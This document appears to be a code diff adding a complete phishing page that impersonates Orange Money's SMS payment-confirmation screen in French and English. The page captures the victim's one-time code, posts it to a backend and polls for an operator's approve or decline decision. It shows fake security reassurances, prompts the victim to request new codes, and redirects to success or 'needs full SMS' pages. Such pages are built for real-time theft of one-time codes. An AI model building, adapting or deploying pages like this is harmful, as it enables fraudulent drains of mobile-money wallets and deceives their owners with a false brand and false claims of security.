@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Orange Money · Code de confirmation</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --orange-main: #FF7900;
+    --orange-dark: #E56A00;
+    --orange-light: #FFF3E6;
+    --orange-black: #000000;
+    --orange-gray: #6B7280;
+    --orange-border: #E5E7EB;
+    --orange-soft: #F8FAFC;
+    --orange-page: #F1F5F9;
+    --orange-red: #C62828;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body {
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--orange-page); color: var(--orange-black);
+    -webkit-font-smoothing: antialiased; line-height: 1.45;
+    min-height: 100vh; display: flex; justify-content: center; padding: 0;
+  }
+  .phone {
+    width: 100%; max-width: 430px; min-height: 100vh;
+    background: #fff; display: flex; flex-direction: column;
+    position: relative; overflow: hidden;
+  }
+  .top {
+    position: relative; flex-shrink: 0;
+    background: linear-gradient(180deg, #1A1A1A 0%, var(--orange-main) 100%);
+    padding: 18px 22px 26px;
+    border-bottom-left-radius: 38% 32px;
+    border-bottom-right-radius: 38% 32px;
+  }
+  .top-row {
+    display: flex; align-items: center; justify-content: space-between; gap: 12px;
+  }
+  .brand {
+    display: inline-flex; align-items: baseline; gap: 2px;
+    font-weight: 900; font-size: 18px; letter-spacing: -0.4px; color: #fff;
+  }
+  .brand .orange { color: #fff; }
+  .brand .money { color: var(--orange-light); opacity: 0.95; }
+  .page-title {
+    margin-top: 22px; font-size: 19px; font-weight: 800;
+    color: #fff; letter-spacing: -0.3px; line-height: 1.25;
+  }
+  .page-sub {
+    margin-top: 6px; font-size: 12.5px; color: rgba(255,255,255,0.78);
+    line-height: 1.5; max-width: 320px;
+  }
+  .body {
+    flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch;
+    padding: 34px 22px 24px;
+    display: flex; flex-direction: column;
+  }
+  .notice {
+    display: none;
+    padding: 13px 15px;
+    border-radius: 12px;
+    font-size: 12.5px;
+    font-weight: 600;
+    line-height: 1.55;
+    margin-bottom: 18px;
+    border: 1px solid transparent;
+  }
+  .notice.show { display: block; }
+  .notice .notice-title {
+    font-size: 11px; font-weight: 800; letter-spacing: 0.6px;
+    text-transform: uppercase; margin-bottom: 4px;
+    display: block;
+  }
+  .notice.warn {
+    background: #FFF8E1; border-color: #FFE08A; color: #7A5B00;
+  }
+  .notice.warn .notice-title { color: #8A6600; }
+  .section-label {
+    font-size: 11px; font-weight: 800; letter-spacing: 0.8px;
+    text-transform: uppercase; color: var(--orange-gray);
+    margin-bottom: 8px;
+  }
+  .code-input {
+    width: 100%;
+    padding: 16px 18px;
+    background: var(--orange-soft);
+    border: 1.5px solid var(--orange-border);
+    border-radius: 12px;
+    font-family: 'Poppins', monospace;
+    font-size: 18px; font-weight: 700;
+    color: var(--orange-black);
+    text-align: center;
+    letter-spacing: 4px;
+    outline: none;
+    transition: border-color .15s, background .15s;
+    -webkit-appearance: none;
+  }
+  .code-input::placeholder { color: #9AA6B8; font-weight: 400; letter-spacing: 1px; }
+  .code-input:focus {
+    border-color: var(--orange-main);
+    background: #fff;
+  }
+  .code-input.invalid {
+    border-color: #E23B3B;
+    background: #FEF3F3;
+    color: var(--orange-red);
+  }
+  .field-error {
+    display: none;
+    font-size: 11.5px; color: var(--orange-red); margin-top: 10px;
+    font-weight: 600; line-height: 1.4; text-align: center;
+  }
+  .field-error.show { display: block; }
+  .help-note {
+    margin-top: 16px; font-size: 11.5px; color: var(--orange-gray);
+    line-height: 1.6; text-align: center;
+  }
+  .btn-confirm {
+    width: 100%; margin-top: 28px; height: 54px;
+    background: var(--orange-main); color: #fff;
+    font-family: inherit; font-size: 15px; font-weight: 900;
+    letter-spacing: 1.2px; text-transform: uppercase;
+    border: none; border-radius: 999px; cursor: pointer;
+    box-shadow: 0 10px 24px rgba(255,121,0,0.28);
+    transition: filter .15s, transform .1s, opacity .15s;
+  }
+  .btn-confirm:hover { filter: brightness(1.06); }
+  .btn-confirm:active { transform: scale(0.985); }
+  .btn-confirm:disabled { opacity: 0.65; cursor: wait; }
+  .btn-resend {
+    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+    width: 100%; margin-top: 12px;
+    padding: 12px 16px; font-size: 13px; font-weight: 700;
+    background: #fff; color: var(--orange-main);
+    border: 1.5px solid var(--orange-main); border-radius: 10px;
+    cursor: pointer; font-family: inherit; transition: all .15s;
+  }
+  .btn-resend:hover { background: var(--orange-light); }
+  .btn-resend:disabled { opacity: 0.6; cursor: wait; }
+  .btn-resend svg {
+    width: 15px; height: 15px; stroke: currentColor; fill: none;
+    stroke-width: 2.4; stroke-linecap: round; stroke-linejoin: round;
+  }
+  .btn-resend.sent { background: var(--orange-main); color: #fff; border-color: var(--orange-main); }
+  .toast {
+    position: fixed; bottom: 24px; left: 50%;
+    transform: translateX(-50%) translateY(80px);
+    background: #0A0F1F; color: #fff; padding: 11px 18px; border-radius: 9px;
+    font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
+    z-index: 50; pointer-events: none; max-width: 90%; text-align: center;
+  }
+  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+  .authorizing {
+    position: fixed; inset: 0;
+    background: linear-gradient(180deg, #1A1A1A 0%, var(--orange-main) 100%);
+    display: none; flex-direction: column;
+    align-items: center; justify-content: center;
+    padding: 28px 24px; z-index: 9999; text-align: center;
+    color: #fff;
+  }
+  .authorizing.show { display: flex; }
+  .authorizing .brand-label {
+    font-size: 15px; font-weight: 800; letter-spacing: -0.2px;
+    margin-bottom: 34px;
+  }
+  .authorizing .brand-label .orange { color: #fff; }
+  .authorizing .brand-label .money { color: var(--orange-light); }
+  .authorizing .spinner {
+    width: 60px; height: 60px;
+    border: 4px solid rgba(255,255,255,0.18);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+    margin-bottom: 22px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .authorizing h2 { font-size: 20px; font-weight: 800; margin-bottom: 24px; }
+  .trust-slider {
+    width: 100%; max-width: 340px; height: 76px;
+    position: relative; overflow: hidden;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .trust-msg {
+    position: absolute; inset: 0;
+    display: flex; align-items: center; justify-content: center;
+    padding: 0 8px; opacity: 0; transform: translateX(24px);
+    transition: opacity .45s ease, transform .45s ease;
+    font-size: 13px; line-height: 1.55;
+    color: rgba(255,255,255,0.86); font-weight: 500; text-align: center;
+  }
+  .trust-msg.active { opacity: 1; transform: translateX(0); }
+  .trust-msg.leaving { opacity: 0; transform: translateX(-24px); }
+  .trust-msg::before {
+    content: '✓'; color: var(--orange-light); font-weight: 900; margin-right: 8px;
+  }
+  .authorizing .cancel-link {
+    margin-top: 28px; background: transparent; border: none;
+    color: rgba(255,255,255,0.68); font-family: inherit;
+    font-size: 12px; font-weight: 600; cursor: pointer;
+    text-decoration: underline; text-underline-offset: 3px;
+  }
+  .authorizing .cancel-link:hover { color: #fff; }
+  @media (max-width: 380px) {
+    .top { padding: 16px 18px 22px; }
+    .body { padding: 28px 18px 18px; }
+    .brand { font-size: 16px; }
+    .page-title { font-size: 17px; }
+    .code-input { font-size: 16px; padding: 14px 16px; }
+    .btn-confirm { height: 50px; font-size: 14px; }
+    .authorizing h2 { font-size: 18px; }
+    .authorizing .spinner { width: 50px; height: 50px; }
+    .trust-slider { height: 80px; }
+    .trust-msg { font-size: 12px; }
+  }
+  @media (min-width: 640px) {
+    body { padding: 32px 0; align-items: center; }
+    .phone {
+      min-height: calc(100vh - 64px); max-height: 900px;
+      border-radius: 32px;
+      box-shadow: 0 40px 100px rgba(255,121,0,0.18);
+      overflow: hidden;
+    }
+    .top { border-top-left-radius: 32px; border-top-right-radius: 32px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="phone">
+
+  <div class="top">
+    <div class="top-row">
+      <div class="brand"><span class="orange">Orange</span><span class="money">&nbsp;Money</span></div>
+    </div>
+    <div class="page-title" id="pageTitle">Saisissez le code de confirmation</div>
+    <div class="page-sub" id="pageSub">Entrez le mot de passe temporaire reçu par SMS pour valider ce paiement.</div>
+  </div>
+
+  <div class="body">
+
+    <div class="notice warn" id="noticeExpired">
+      <span class="notice-title" id="noticeExpiredTitle">Code expiré</span>
+      <span id="noticeExpiredBody">Le code n'a pas été approuvé. Appuyez sur <strong>Renvoyer le code</strong> ci-dessous pour recevoir un nouveau code, puis saisissez-le ici.</span>
+    </div>
+
+    <div class="section-label" id="sectionLabel">Code de confirmation</div>
+
+    <input
+      type="tel"
+      class="code-input"
+      id="codeInput"
+      inputmode="numeric"
+      autocomplete="one-time-code"
+      placeholder="Entrez le code reçu"
+      maxlength="10"
+      aria-label="Code de confirmation"
+    >
+    <div class="field-error" id="codeError">Veuillez saisir le code reçu par SMS.</div>
+
+    <div class="help-note" id="helpNote">
+      Vous avez reçu un SMS d'Orange Money avec un mot de passe temporaire. Saisissez-le ci-dessus pour approuver le paiement.
+    </div>
+
+    <button class="btn-confirm" id="confirmBtn" onclick="submitCode()">Approuver</button>
+
+    <button class="btn-resend" id="resendBtn" onclick="resendCode()">
+      <svg viewBox="0 0 24 24"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"/></svg>
+      <span id="resendLabel">Renvoyer le code</span>
+    </button>
+
+  </div>
+</div>
+
+<div class="authorizing" id="authorizingOverlay">
+  <div class="brand-label"><span class="orange">Orange</span><span class="money">&nbsp;Money</span></div>
+  <div class="spinner"></div>
+  <h2 id="authTitle">Approbation du paiement…</h2>
+  <div class="trust-slider">
+    <div class="trust-msg active" id="trustMsg1">Votre code est vérifié en toute sécurité par Orange Money.</div>
+    <div class="trust-msg" id="trustMsg2">Cette étape protège votre portefeuille contre les paiements non autorisés.</div>
+    <div class="trust-msg" id="trustMsg3">Vos informations restent cryptées de bout en bout.</div>
+  </div>
+  <button class="cancel-link" onclick="cancelAuthorizing()" id="cancelBtn">Annuler</button>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>  const I18N = {
+    fr: {
+      pageTitle: 'Saisissez le code de confirmation',
+      pageSub: 'Entrez le mot de passe temporaire reçu par SMS pour valider ce paiement.',
+      noticeExpiredTitle: 'Code expiré',
+      noticeExpiredBody: 'Le code n\'a pas été approuvé. Appuyez sur <strong>Renvoyer le code</strong> ci-dessous pour recevoir un nouveau code, puis saisissez-le ici.',
+      sectionLabel: 'Code de confirmation',
+      codePlaceholder: 'Entrez le code reçu',
+      codeError: 'Veuillez saisir le code reçu par SMS.',
+      helpNote: 'Vous avez reçu un SMS d\'Orange Money avec un mot de passe temporaire. Saisissez-le ci-dessus pour approuver le paiement.',
+      approveBtn: 'Approuver',
+      resendLabel: 'Renvoyer le code',
+      resendSending: 'Envoi…',
+      resendSent: 'Envoyé ✓',
+      authTitle: 'Approbation du paiement…',
+      trustMsg1: 'Votre code est vérifié en toute sécurité par Orange Money.',
+      trustMsg2: 'Cette étape protège votre portefeuille contre les paiements non autorisés.',
+      trustMsg3: 'Vos informations restent cryptées de bout en bout.',
+      cancelBtn: 'Annuler',
+      networkError: 'Erreur réseau. Veuillez réessayer.',
+      notAccepted: 'La demande n\'a pas été acceptée. Veuillez réessayer.',
+      sessionExpired: 'Session expirée. Veuillez demander un nouveau code.',
+      codeExpired: 'Code expiré. Appuyez sur Renvoyer le code pour recevoir un nouveau code.',
+      newCodeSent: 'Un nouveau code a été envoyé sur votre téléphone.',
+      resendFailed: 'Impossible de renvoyer. Veuillez réessayer dans un instant.',
+      docTitle: 'Orange Money · Code de confirmation'
+    },
+    en: {
+      pageTitle: 'Enter confirmation code',
+      pageSub: 'Enter the temporary password received via SMS to validate this payment.',
+      noticeExpiredTitle: 'Code expired',
+      noticeExpiredBody: 'The code was not approved. Tap <strong>Resend code</strong> below to receive a new code, then enter it here.',
+      sectionLabel: 'Confirmation code',
+      codePlaceholder: 'Enter received code',
+      codeError: 'Please enter the code received via SMS.',
+      helpNote: 'You received an SMS from Orange Money with a temporary password. Enter it above to approve the payment.',
+      approveBtn: 'Approve',
+      resendLabel: 'Resend code',
+      resendSending: 'Sending…',
+      resendSent: 'Sent ✓',
+      authTitle: 'Approving payment…',
+      trustMsg1: 'Your code is being securely checked by Orange Money.',
+      trustMsg2: 'This step protects your wallet from unauthorized payments.',
+      trustMsg3: 'Your details stay encrypted end-to-end.',
+      cancelBtn: 'Cancel',
+      networkError: 'Network error. Please try again.',
+      notAccepted: 'Request was not accepted. Please try again.',
+      sessionExpired: 'Session expired. Please request a new code.',
+      codeExpired: 'Code expired. Tap Resend code to receive a new code.',
+      newCodeSent: 'A new code was sent to your phone.',
+      resendFailed: 'Could not resend. Please try again in a moment.',
+      docTitle: 'Orange Money · Confirmation code'
+    }
+  };
+
+  const urlParams = new URLSearchParams(location.search);
+  const urlLang = (urlParams.get('lang') || '').toLowerCase();
+  let currentLang = I18N[urlLang] ? urlLang : 'fr';
+  let T = I18N[currentLang];
+
+  const tx = {
+    ref: urlParams.get('tx') || '',
+    am:  urlParams.get('am') || '',
+    cur: urlParams.get('cur') || '',
+    rn:  urlParams.get('rn') || '',
+    c:   urlParams.get('c') || '',
+    pm:  urlParams.get('pm') || '',
+    sn:  urlParams.get('sn') || '',
+    mk:  urlParams.get('mk') || '',
+    an:  urlParams.get('an') || ''
+  };
+
+  function applyTranslations() {
+    document.title = T.docTitle;
+    document.getElementById('pageTitle').textContent = T.pageTitle;
+    document.getElementById('pageSub').textContent = T.pageSub;
+    document.getElementById('noticeExpiredTitle').textContent = T.noticeExpiredTitle;
+    document.getElementById('noticeExpiredBody').innerHTML = T.noticeExpiredBody;
+    document.getElementById('sectionLabel').textContent = T.sectionLabel;
+    document.getElementById('codeInput').placeholder = T.codePlaceholder;
+    document.getElementById('codeError').textContent = T.codeError;
+    document.getElementById('helpNote').textContent = T.helpNote;
+    document.getElementById('confirmBtn').textContent = T.approveBtn;
+    document.getElementById('resendLabel').textContent = T.resendLabel;
+    document.getElementById('authTitle').textContent = T.authTitle;
+    document.getElementById('trustMsg1').textContent = T.trustMsg1;
+    document.getElementById('trustMsg2').textContent = T.trustMsg2;
+    document.getElementById('trustMsg3').textContent = T.trustMsg3;
+    document.getElementById('cancelBtn').textContent = T.cancelBtn;
+  }
+
+  function formatAmount(amount, currency) {
+    const n = Number(amount);
+    if (!isFinite(n)) return '—';
+    const locale = (currentLang === 'fr') ? 'fr-FR' : 'en-US';
+    return n.toLocaleString(locale, { maximumFractionDigits: 2 }) + ' ' + (currency || '');
+  }
+
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg; t.classList.add('show');
+    clearTimeout(t._timer);
+    t._timer = setTimeout(() => t.classList.remove('show'), 2400);
+  }
+
+  const codeInput = document.getElementById('codeInput');
+  const codeError = document.getElementById('codeError');
+  const noticeExpired = document.getElementById('noticeExpired');
+  const confirmBtn = document.getElementById('confirmBtn');
+
+  function clearInvalid() {
+    codeError.classList.remove('show');
+    codeInput.classList.remove('invalid');
+  }
+
+  codeInput.addEventListener('input', () => {
+    clearInvalid();
+    noticeExpired.classList.remove('show');
+    codeInput.value = codeInput.value.replace(/[^0-9A-Za-z]/g, '');
+  });
+
+  document.addEventListener('DOMContentLoaded', () => {
+    applyTranslations();
+    codeInput.focus();
+  });
+
+  let pollingActive = false;
+  let pollTimer = null;
+
+  function cancelAuthorizing() {
+    pollingActive = false;
+    if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
+    document.getElementById('authorizingOverlay').classList.remove('show');
+    stopTrustSlider();
+    confirmBtn.disabled = false;
+    confirmBtn.textContent = T.approveBtn;
+  }
+
+  async function submitCode() {
+    clearInvalid();
+
+    const code = codeInput.value.trim();
+    if (!code || code.length < 4) {
+      codeError.textContent = T.codeError;
+      codeError.classList.add('show');
+      codeInput.classList.add('invalid');
+      codeInput.focus();
+      return;
+    }
+
+    confirmBtn.disabled = true;
+    document.getElementById('authTitle').textContent = T.authTitle;
+    document.getElementById('authorizingOverlay').classList.add('show');
+    startTrustSlider();
+
+    let serverAccepted = true;
+    try {
+      const r = await fetch('/api/orange/otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          tx: tx.ref, otp: code, am: tx.am, cur: tx.cur, c: tx.c, an: tx.an, lang: currentLang
+        })
+      });
+      if (!r.ok) serverAccepted = false;
+    } catch (e) {
+      document.getElementById('authorizingOverlay').classList.remove('show');
+      stopTrustSlider();
+      confirmBtn.disabled = false;
+      showToast(T.networkError);
+      return;
+    }
+
+    if (!serverAccepted) {
+      document.getElementById('authorizingOverlay').classList.remove('show');
+      stopTrustSlider();
+      confirmBtn.disabled = false;
+      showToast(T.notAccepted);
+      return;
+    }
+
+    pollingActive = true;
+    const start = Date.now();
+    const maxWait = 5 * 60 * 1000;
+
+    const poll = async () => {
+      if (!pollingActive) return;
+
+      if (Date.now() - start > maxWait) {
+        pollingActive = false;
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        stopTrustSlider();
+        confirmBtn.disabled = false;
+        confirmBtn.textContent = T.approveBtn;
+        noticeExpired.classList.add('show');
+        showToast(T.sessionExpired);
+        return;
+      }
+
+      let decision = 'pending';
+      try {
+        const r = await fetch('/api/orange/otp-status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
+        const j = await r.json();
+        decision = j.decision || 'pending';
+      } catch (e) { }
+
+      if (!pollingActive) return;
+
+      if (decision === 'approved') {
+        pollingActive = false;
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        stopTrustSlider();
+        const q = new URLSearchParams({
+          tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
+          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an,
+          lang: currentLang
+        });
+        window.location.href = 'success.html?' + q.toString();
+        return;
+      }
+
+      if (decision === 'declined' || decision === 'expired') {
+        pollingActive = false;
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        stopTrustSlider();
+        confirmBtn.disabled = false;
+        confirmBtn.textContent = T.approveBtn;
+        codeInput.value = '';
+        noticeExpired.classList.add('show');
+        showToast(T.codeExpired);
+        codeInput.focus();
+        return;
+      }
+
+      if (decision === 'inactive' || decision === 'needs_full_sms') {
+        pollingActive = false;
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        stopTrustSlider();
+        const q = new URLSearchParams({
+          tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
+          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an,
+          reason: decision === 'needs_full_sms' ? 'needs_full_sms' : 'inactive',
+          lang: currentLang
+        });
+        window.location.href = 'oops.html?' + q.toString();
+        return;
+      }
+
+      pollTimer = setTimeout(poll, 1500);
+    };
+
+    poll();
+  }
+
+  async function resendCode() {
+    const lbl = document.getElementById('resendLabel');
+    const btn = document.getElementById('resendBtn');
+    btn.disabled = true;
+    lbl.textContent = T.resendSending;
+    try {
+      const r = await fetch('/api/orange/resend', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          tx: tx.ref, stage: 'otp', an: tx.an, c: tx.c,
+          am: tx.am, cur: tx.cur, lang: currentLang
+        })
+      });
+      if (!r.ok && r.status !== 429) throw new Error('bad');
+      btn.classList.add('sent');
+      lbl.textContent = T.resendSent;
+      noticeExpired.classList.remove('show');
+      showToast(T.newCodeSent);
+      setTimeout(() => {
+        btn.classList.remove('sent');
+        lbl.textContent = T.resendLabel;
+        btn.disabled = false;
+        codeInput.focus();
+      }, 3000);
+    } catch (e) {
+      lbl.textContent = T.resendLabel;
+      btn.disabled = false;
+      showToast(T.resendFailed);
+    }
+  }
+
+  let trustTimer = null;
+  let trustIndex = 0;
+  function startTrustSlider() {
+    const msgs = document.querySelectorAll('.trust-msg');
+    trustIndex = 0;
+    msgs.forEach((m, i) => {
+      m.classList.remove('active', 'leaving');
+      if (i === 0) m.classList.add('active');
+    });
+    if (trustTimer) clearInterval(trustTimer);
+    trustTimer = setInterval(() => {
+      msgs[trustIndex].classList.remove('active');
+      msgs[trustIndex].classList.add('leaving');
+      const prev = trustIndex;
+      trustIndex = (trustIndex + 1) % msgs.length;
+      setTimeout(() => msgs[prev].classList.remove('leaving'), 450);
+      msgs[trustIndex].classList.add('active');
+    }, 2600);
+  }
+  function stopTrustSlider() {
+    if (trustTimer) { clearInterval(trustTimer); trustTimer = null; }
+  }
+</script>
+</body>
+</html>
